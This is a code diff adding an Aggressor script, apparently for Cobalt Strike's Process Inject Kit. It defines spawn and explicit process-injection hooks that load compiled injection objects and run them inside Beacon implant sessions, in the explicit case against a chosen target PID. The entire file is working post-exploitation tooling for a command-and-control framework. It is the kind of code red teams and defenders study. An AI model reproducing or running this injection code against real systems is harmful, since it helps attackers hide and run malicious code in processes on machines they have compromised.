@@ -1,0 +1,71 @@
+
+print_info("Process Inject Kit Loaded");
+$process_inject_kit_path = iff($process_inject_kit_path eq "", script_resource(""), $process_inject_kit_path);
+
+# PROCESS_INJECT_SPAWN HOOK
+# Arguments
+#  $1 = Beacon ID
+#  $2 = memory injectable dll (position-independent code)
+#  $3 = true/false ignore process token
+#  $4 = x86/x64 - memory injectable DLL arch
+
+set PROCESS_INJECT_SPAWN {
+
+   print_info("PROCESS_INJECT_SPAWN hook");
+
+   local('$barch $handle $data $args $entry');
+
+   $barch = barch($1);
+
+   # read in the injection BOF based on barch
+
+   $pi_object = getFileProper($process_inject_kit_path, "process_inject_spawn $+ . $+ $barch $+ .o");
+
+   $handle = openf($pi_object);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   print_info("Process Inject - " . $pi_object);
+   print_info("Process Inject - Length " . strlen($data));
+
+   $args = bof_pack($1, "sb", $3, $2);
+
+   btask($1, "Process Inject using fork and run.");
+
+   $entry = "go $+ $4";
+   beacon_inline_execute($1, $data, $entry, $args);
+
+   return 1;
+}
+
+# PROCESS_INJECT_EXPLICIT HOOK
+# Arguments
+#  $1 = Beacon ID
+#  $2 = memory injectable dll for the post exploitation command
+#  $3 = the PID to inject into
+#  $4 = offset to jump to
+#  $5 = x86/x64 - memory injectable DLL arch
+set PROCESS_INJECT_EXPLICIT {
+
+   print_info("PROCESS_INJECT_EXPLICIT hook");
+
+   local('$barch $handle $data $args $entry');
+
+   $barch = barch($1);
+   $pi_object = getFileProper($process_inject_kit_path, "process_inject_explicit $+ . $+ $barch $+ .o");
+
+   $handle = openf($pi_object);
+   $data   = readb($handle, -1);
+   closef($handle);
+
+   print_info("Process Inject - " . $pi_object);
+   print_info("Process Inject - Length " . strlen($data));
+   print_info("Process Inject - Target PID " . $3);
+   $args = bof_pack($1, "iib", $3, $4, $2);
+
+   btask($1, "Process Inject using explicit injection into $3");
+
+   $entry = "go $+ $5";
+   beacon_inline_execute($1, $data, $entry, $args);
+   return 1;
+}
